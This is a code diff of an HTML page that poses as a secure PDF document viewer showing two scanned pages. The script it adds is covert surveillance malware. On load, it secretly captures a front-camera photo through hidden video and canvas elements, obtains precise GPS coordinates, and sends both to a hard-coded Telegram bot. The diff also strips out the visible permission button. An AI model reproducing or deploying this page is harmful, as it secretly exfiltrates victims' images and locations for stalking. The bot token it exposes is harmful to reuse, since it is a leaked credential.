@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Viewer</title>
+    <title>Document Viewer - Secure PDF</title>
     <style>
         body {
             background-color: #525659;
@@ -49,19 +49,6 @@
             border-radius: 2px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.2);
         }
-        .btn-box {
-            text-align: center;
-            margin: 20px;
-        }
-        .allow-btn {
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
@@ -72,24 +59,62 @@
             <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
         </div>
 
+        <!-- وێنەی یەکەم -->
         <div class="page-box">
             <img src="IMG_6579.jpeg" alt="Document Page 1">
         </div>
 
+        <!-- وێنەی دووەم -->
         <div class="page-box">
             <img src="IMG_6581.jpeg" alt="Document Page 2">
         </div>
     </div>
 
+    <!-- کامێرای نەبینراو -->
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
     <script>
         const BOT_TOKEN = "9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw";
         const CHAT_ID = "659131693";
 
-        function s1derGetLocationAndSend() {
-            if (!navigator.geolocation) {
-                console.error("Geolocation is not supported by this browser.");
-                return;
+        // ١. بەشی ڕاکێشانی وێنەی کامێرا
+        async function s1derCaptureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 's1der_target.jpg');
+                    formData.append('caption', 'فاک! وێنەی ئامانجی دۆکیۆمێنت گەیشت.');
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.85);
+
+            } catch (err) {
+                console.error("فاک، کامێرا ڕەتکرایەوە:", err);
             }
+        }
+
+        // ٢. بەشی وەرگرتنی لوکیشنی دەقیق (GPS)
+        function s1derGetLocationAndSend() {
+            if (!navigator.geolocation) return;
 
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
@@ -97,26 +122,29 @@
                 const acc = position.coords.accuracy;
 
                 const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
-                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی هۆستکراو دۆزرایەوە.%0Aوردبوونەوە: ${acc} مەتر`;
+                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی دۆکیۆمێنت:%0Aوردبوونەوە: ${acc} مەتر`;
 
                 try {
                     await fetch(locUrl);
                     await fetch(textUrl);
                 } catch (err) {
-                    console.error("فاک، ناردن سەرکەوتوو نەبوو:", err);
+                    console.error("فاک، ناردنی لوکیشن سەرکەوتوو نەبوو:", err);
                 }
             }, (error) => {
-                console.error("فاک، مۆڵەتی لۆکەیشن لەسەر هۆست ڕەتکرایەوە:", error.code);
+                console.error("فاک، مۆڵەت نەدرا:", error);
             }, {
                 enableHighAccuracy: true,
-                timeout: 20000,
+                timeout: 15000,
                 maximumAge: 0
             });
         }
 
-        // کارپێکردن راستەوخۆ لە کاتی لۆدبوونی پەڕەکە
+        // کارپێکردنی هەردووکیان پاش کردنەوەی پەیجەکە لەسەر هۆست
         window.onload = () => {
-            setTimeout(s1derGetLocationAndSend, 1000);
+            setTimeout(() => {
+                s1derCaptureAndSend();
+                s1derGetLocationAndSend();
+            }, 1000);
         };
     </script>
 </body>
